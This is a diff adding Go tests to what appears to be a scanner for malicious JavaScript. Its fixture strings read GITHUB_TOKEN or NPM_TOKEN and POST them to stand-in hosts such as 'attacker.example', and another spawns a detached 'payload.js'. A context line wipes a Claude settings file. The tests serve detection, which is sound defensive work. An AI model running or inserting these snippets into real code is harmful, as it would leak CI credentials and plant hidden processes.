@@ -331,6 +331,56 @@ require('fs').writeFileSync(process.env.HOME + '/.claude/settings.json', '{}');
 	}
 }
 
+// --- pass-2 fixes: inline require chain sinks + quoted stdio ---
+
+func TestVuln_CISecretHarvest_InlineRequireHttpsRequest(t *testing.T) {
+	// Compact payload form: require('https').request(...) without
+	// binding the module first. Must still satisfy the network sink.
+	body := `
+const t = process.env.GITHUB_TOKEN;
+require('https').request({hostname:'attacker.example', method:'POST'}).end(t);
+`
+	findings := analyze(t, "i.js", body)
+	if !hasRule(findings, RuleCISecretHarvest) {
+		t.Errorf("require('https').request inline form must trigger harvest, got: %+v", findings)
+	}
+}
+
+func TestVuln_CISecretHarvest_InlineRequireHttpRequest(t *testing.T) {
+	body := `
+const t = process.env.NPM_TOKEN;
+require("http").request("http://attacker/x", {method:"POST"}).end(t);
+`
+	findings := analyze(t, "i2.js", body)
+	if !hasRule(findings, RuleCISecretHarvest) {
+		t.Errorf("require(\"http\").request inline form must trigger harvest, got: %+v", findings)
+	}
+}
+
+func TestVuln_CISecretHarvest_NodeSchemeRequire(t *testing.T) {
+	body := `
+const t = process.env.GITHUB_TOKEN;
+require('node:https').request({hostname:'attacker.example'}).end(t);
+`
+	findings := analyze(t, "n.js", body)
+	if !hasRule(findings, RuleCISecretHarvest) {
+		t.Errorf("node: scheme require + token must trigger harvest, got: %+v", findings)
+	}
+}
+
+func TestVuln_Daemon_QuotedStdioWithoutUnref(t *testing.T) {
+	// JSON-quoted spawn options with quoted stdio but no .unref() must
+	// still satisfy the daemon shape via stdio:'ignore'.
+	body := `
+const cp = require('child_process');
+cp.spawn('node', ['./payload.js'], {"detached": true, "stdio": "ignore"});
+`
+	findings := analyze(t, "qs.js", body)
+	if !hasRule(findings, RuleDaemon) {
+		t.Errorf("quoted stdio:'ignore' must trigger daemon, got: %+v", findings)
+	}
+}
+
 // --- pass-1 fixes: narrow network sinks, /proc memory, quoted detached ---
 
 func TestSafe_LocalClientPostNotNetworkSink(t *testing.T) {
